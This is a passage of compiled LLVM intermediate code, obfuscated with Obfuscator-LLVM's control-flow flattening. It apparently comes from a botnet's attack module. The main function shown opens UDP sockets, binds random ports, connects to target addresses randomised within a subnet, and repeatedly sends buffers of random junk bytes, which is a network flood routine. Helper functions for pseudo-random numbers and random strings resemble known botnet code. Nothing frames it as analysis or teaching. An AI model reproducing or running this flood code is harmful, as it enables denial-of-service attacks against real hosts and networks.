  %40 = srem i32 %39, 65482
  %41 = add nsw i32 53, %40
  %42 = trunc i32 %41 to i16
  %43 = call zeroext i16 @retrieve_opt_num(%struct.option* %35, i8 zeroext %38, i8 zeroext 1, i16 zeroext %42)
  store i16 %43, i16* %4, align 2
  %44 = call i32 @socket(i32 2, i32 2, i32 0) #8
  %45 = load i32*, i32** %7, align 8
  %46 = load i32, i32* %5, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  store i32 %44, i32* %48, align 4
  %49 = load i32*, i32** %7, align 8
  %50 = load i32, i32* %5, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  %53 = load i32, i32* %52, align 4
  %54 = icmp eq i32 %53, -1
  %55 = select i1 %54, i32 -1883050018, i32 531259781
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  call void @exit(i32 1) #10
  unreachable

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %58, align 4
  %59 = call i32 @rand_new()
  %60 = trunc i32 %59 to i16
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %60, i16* %61, align 2
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %63 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %62, i32 0, i32 0
  store i32 0, i32* %63, align 4
  %64 = load i32*, i32** %7, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i32, i32* %64, i64 %66
  %68 = load i32, i32* %67, align 4
  %69 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %70 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  store %struct.sockaddr* %70, %struct.sockaddr** %69, align 8
  %71 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %72 = load %struct.sockaddr*, %struct.sockaddr** %71, align 8
  %73 = call i32 @bind(i32 %68, %struct.sockaddr* %72, i32 16) #8
  %74 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %74, align 4
  %75 = load i16, i16* %4, align 2
  %76 = call zeroext i16 @htons(i16 zeroext %75) #9
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %76, i16* %77, align 2
  %78 = load %struct.arguments*, %struct.arguments** %2, align 8
  %79 = getelementptr inbounds %struct.arguments, %struct.arguments* %78, i32 0, i32 0
  %80 = load %struct.target*, %struct.target** %79, align 8
  %81 = load i32, i32* %5, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.target, %struct.target* %80, i64 %82
  %84 = getelementptr inbounds %struct.target, %struct.target* %83, i32 0, i32 1
  %85 = load i16, i16* %84, align 4
  %86 = zext i16 %85 to i32
  %87 = icmp slt i32 %86, 32
  %88 = select i1 %87, i32 1859340586, i32 -863629915
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load %struct.arguments*, %struct.arguments** %2, align 8
  %91 = getelementptr inbounds %struct.arguments, %struct.arguments* %90, i32 0, i32 0
  %92 = load %struct.target*, %struct.target** %91, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.target, %struct.target* %92, i64 %94
  %96 = getelementptr inbounds %struct.target, %struct.target* %95, i32 0, i32 0
  %97 = load i32, i32* %96, align 4
  %98 = call i32 @ntohl(i32 %97) #9
  %99 = call i32 @rand_new()
  %100 = load %struct.arguments*, %struct.arguments** %2, align 8
  %101 = getelementptr inbounds %struct.arguments, %struct.arguments* %100, i32 0, i32 0
  %102 = load %struct.target*, %struct.target** %101, align 8
  %103 = load i32, i32* %5, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.target, %struct.target* %102, i64 %104
  %106 = getelementptr inbounds %struct.target, %struct.target* %105, i32 0, i32 1
  %107 = load i16, i16* %106, align 4
  %108 = zext i16 %107 to i32
  %109 = lshr i32 %99, %108
  %110 = add i32 %98, %109
  %111 = call i32 @htonl(i32 %110) #9
  store i32 -1100188809, i32* %switchVar
  store i32 %111, i32* %.reg2mem2
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load %struct.arguments*, %struct.arguments** %2, align 8
  %114 = getelementptr inbounds %struct.arguments, %struct.arguments* %113, i32 0, i32 0
  %115 = load %struct.target*, %struct.target** %114, align 8
  %116 = load i32, i32* %5, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds %struct.target, %struct.target* %115, i64 %117
  %119 = getelementptr inbounds %struct.target, %struct.target* %118, i32 0, i32 0
  %120 = load i32, i32* %119, align 4
  store i32 -1100188809, i32* %switchVar
  store i32 %120, i32* %.reg2mem2
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  %122 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %123 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %122, i32 0, i32 0
  store i32 %.reload3, i32* %123, align 4
  %124 = load i32*, i32** %7, align 8
  %125 = load i32, i32* %5, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %124, i64 %126
  %128 = load i32, i32* %127, align 4
  %129 = bitcast %union.__CONST_SOCKADDR_ARG* %11 to %struct.sockaddr**
  %130 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %130, %struct.sockaddr** %129, align 8
  %131 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %11, i32 0, i32 0
  %132 = load %struct.sockaddr*, %struct.sockaddr** %131, align 8
  %133 = call i32 @connect(i32 %128, %struct.sockaddr* %132, i32 16)
  store i32 -480431623, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i32, i32* %5, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %5, align 4
  store i32 1143573176, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 -187238082, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 402860823, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %5, align 4
  %141 = load %struct.arguments*, %struct.arguments** %2, align 8
  %142 = getelementptr inbounds %struct.arguments, %struct.arguments* %141, i32 0, i32 3
  %143 = load i8, i8* %142, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp slt i32 %140, %144
  %146 = select i1 %145, i32 1369528229, i32 1726181167
  store i32 %146, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = call i32 @rand() #8
  %149 = srem i32 %148, 436
  %150 = add nsw i32 1024, %149
  %151 = trunc i32 %150 to i16
  store i16 %151, i16* %3, align 2
  %152 = load i16, i16* %3, align 2
  %153 = zext i16 %152 to i64
  %154 = call noalias i8* @malloc(i64 %153) #8
  store i8* %154, i8** %6, align 8
  store i32 0, i32* %12, align 4
  store i32 347317047, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i32, i32* %12, align 4
  %157 = load i16, i16* %3, align 2
  %158 = zext i16 %157 to i32
  %159 = icmp slt i32 %156, %158
  %160 = select i1 %159, i32 103099940, i32 1438844193
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = call i32 @rand() #8
  %163 = and i32 %162, 65535
  %164 = trunc i32 %163 to i8
  %165 = load i8*, i8** %6, align 8
  %166 = load i32, i32* %12, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i8, i8* %165, i64 %167
  store i8 %164, i8* %168, align 1
  store i32 -766712643, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i32, i32* %12, align 4
  %171 = add nsw i32 %170, 1
  store i32 %171, i32* %12, align 4
  store i32 347317047, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32*, i32** %7, align 8
  %174 = load i32, i32* %5, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds i32, i32* %173, i64 %175
  %177 = load i32, i32* %176, align 4
  %178 = load i8*, i8** %6, align 8
  %179 = load i16, i16* %3, align 2
  %180 = zext i16 %179 to i64
  %181 = call i64 @send(i32 %177, i8* %178, i64 %180, i32 16384)
  store i32 1687809004, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %5, align 4
  %184 = add nsw i32 %183, 1
  store i32 %184, i32* %5, align 4
  store i32 402860823, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  store i32 -187238082, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %185, %182, %172, %169, %161, %155, %147, %139, %138, %137, %134, %121, %112, %89, %57, %32, %24, %23, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @rand() #2

; Function Attrs: noinline nounwind uwtable
define i32 @rand_new() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @t, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 15
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 9
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @p, align 4
  store i32 %11, i32* @t, align 4
  %12 = load i32, i32* @c, align 4
  store i32 %12, i32* @p, align 4
  %13 = load i32, i32* @f, align 4
  store i32 %13, i32* @c, align 4
  %14 = load i32, i32* @f, align 4
  %15 = lshr i32 %14, 13
  %16 = load i32, i32* @f, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @f, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @f, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @f, align 4
  %21 = load i32, i32* @f, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_string(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i8 0, i8* %7, align 1
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 697409669, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 697409669, label %8
    i32 1667879117, label %13
    i32 1948482470, label %28
    i32 -1084722598, label %31
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %5, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %9, %10
  %12 = select i1 %11, i32 1667879117, i32 -1084722598
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = call i32 @rand_new()
  store i32 %14, i32* %6, align 4
  %15 = load i32, i32* %6, align 4
  %16 = and i32 %15, 255
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %7, align 1
  %18 = load i8, i8* %7, align 1
  %19 = zext i8 %18 to i32
  %20 = ashr i32 %19, 3
  %21 = trunc i32 %20 to i8
  store i8 %21, i8* %7, align 1
  %22 = load i8, i8* %7, align 1
  %23 = zext i8 %22 to i64
  %24 = getelementptr inbounds [36 x i8], [36 x i8]* @alpha_set, i64 0, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = load i8*, i8** %3, align 8
  %27 = getelementptr inbounds i8, i8* %26, i32 1
  store i8* %27, i8** %3, align 8
  store i8 %25, i8* %26, align 1
  store i32 1948482470, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %5, align 4
  %30 = add nsw i32 %29, 1
  store i32 %30, i32* %5, align 4
  store i32 697409669, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %28, %13, %8, %switchDefault
  br label %loopEntry
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind readonly }
attributes #8 = { nounwind }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
